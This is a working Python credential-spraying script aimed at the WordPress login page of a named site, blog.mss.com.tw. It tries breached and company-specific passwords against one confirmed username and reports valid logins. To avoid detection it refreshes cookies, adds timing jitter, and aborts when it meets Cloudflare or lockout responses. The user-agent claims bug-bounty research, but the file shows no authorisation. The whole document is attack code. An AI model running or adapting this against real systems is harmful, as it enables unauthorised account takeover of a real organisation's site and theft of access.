#!/usr/bin/env python3
"""
Extended cookie-aware WordPress wp-login.php spray for blog.mss.com.tw.

Focus: pumomss (only confirmed-valid account). Covers breached pw 41-200 +
company-specific never-seen list. Retries transient status-0 (CF drop) once.

  - GET wp-login.php per round -> fresh test cookie, sent in POST
  - FAIL  = body contains id="login_error"
  - SUCCESS = 3xx to non-login  OR  200 without login_error
  - HARD ABORT on 403 / 429 / Cloudflare challenge / lockout text
  - JSONL audit log, password hashed (sha256[:12]) not stored plaintext
"""
import hashlib, http.cookiejar, json, random, re, ssl, sys, time, urllib.parse, urllib.request

URL        = "https://blog.mss.com.tw/wp-login.php"
USERS      = ["pumomss"]                                  # only confirmed-valid account
PASS_FILE  = "recon/mss.com.tw/spray/passes-extend.txt"
DELAY      = 15
JITTER     = 6
RETRY      = 1            # retry transient status-0 once
AUDIT      = "recon/mss.com.tw/spray/audit.jsonl"
UA         = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Bug-Bounty-Research"

FAIL_RE    = re.compile(r'id="login_error"')
BLOCK_RE   = re.compile(r"cloudflare|attention required|cf-error|too many|rate limit|"
                        r"locked|blocked|請稍後|嘗試次數|wordfence", re.I)

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def audit(rec):
    from datetime import datetime, timezone
    rec["ts"]=datetime.now(timezone.utc).isoformat()
    with open(AUDIT,"a") as f: f.write(json.dumps(rec,ensure_ascii=False)+"\n")

def opener_with_jar():
    jar=http.cookiejar.CookieJar()
    class NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self,*a,**k): return None
    return urllib.request.build_opener(
        NoRedir, urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPCookieProcessor(jar))

def get_test_cookie(op):
    req=urllib.request.Request(URL,headers={"User-Agent":UA})
    with op.open(req,timeout=20) as r: r.read(1024)

def _once(op,user,pw):
    body=urllib.parse.urlencode({"log":user,"pwd":pw,"wp-submit":"Log In",
                                 "redirect_to":"https://blog.mss.com.tw/wp-admin/",
                                 "testcookie":"1"}).encode()
    req=urllib.request.Request(URL,data=body,method="POST",
        headers={"User-Agent":UA,"Content-Type":"application/x-www-form-urlencoded","Referer":URL})
    status=0; loc=None; txt=""
    try:
        with op.open(req,timeout=20) as r:
            status=r.status; txt=r.read(8192).decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        status=e.code
        if status in (301,302,303,307,308): loc=e.headers.get("Location","")
        try: txt=e.read(8192).decode("utf-8","replace")
        except Exception: pass
    except Exception as e:
        return {"status":0,"err":str(e),"success":False,"block":False}
    block = status in (403,429) or bool(BLOCK_RE.search(txt))
    success = ("wp-login" not in (loc or "")) if loc else ((status==200) and not FAIL_RE.search(txt))
    return {"status":status,"redirect":loc,"success":success,"block":block}

def attempt(op_factory,user,pw):
    res=_once(op_factory(),user,pw)
    tries=0
    while res["status"]==0 and tries<RETRY:
        time.sleep(3); tries+=1
        res=_once(op_factory(),user,pw); res["retried"]=tries
    return res

def main():
    passwords=[l.strip() for l in open(PASS_FILE) if l.strip()]
    print(f"[+] EXTENDED WP spray {URL} | user={USERS} | {len(passwords)} pw")
    audit({"event":"spray_extend_start","url":URL,"users":USERS,"pw_count":len(passwords)})
    hits=[]
    for ri,pw in enumerate(passwords,1):
        def factory():
            op=opener_with_jar()
            try: get_test_cookie(op)
            except Exception: pass
            return op
        for user in USERS:
            res=attempt(factory,user,pw)
            tag="HIT!!!" if res["success"] else ("BLOCK" if res["block"] else ("err0" if res["status"]==0 else "fail"))
            print(f"[{ri}/{len(passwords)}] {user:12} -> {res['status']} {tag}",flush=True)
            audit({"phase":"extend","user":user,"pw_sha":hashlib.sha256(pw.encode()).hexdigest()[:12],
                   "status":res["status"],"success":res["success"],"block":res["block"],"redirect":res.get("redirect")})
            if res["block"]:
                print("\n[!!!] BLOCK/rate-limit/challenge — HARD ABORT.",flush=True)
                audit({"event":"abort_block","user":user,"status":res["status"]}); _sum(hits); return 2
            if res["success"]:
                hits.append((user,pw)); print(f"\n[+++] VALID: {user} : {pw}",flush=True)
                audit({"event":"hit","user":user,"pw_sha":hashlib.sha256(pw.encode()).hexdigest()[:12]})
            time.sleep(DELAY+random.uniform(0,JITTER))
    _sum(hits); return 0

def _sum(hits):
    print("\n"+"="*50,flush=True)
    if hits:
        print(f"[+] {len(hits)} VALID credential(s):")
        for u,p in hits: print(f"    {u} : {p}")
    else:
        print("[-] No valid credentials in extended run.")
    print(f"[+] Audit log: {AUDIT}",flush=True)

if __name__=="__main__":
    sys.exit(main())
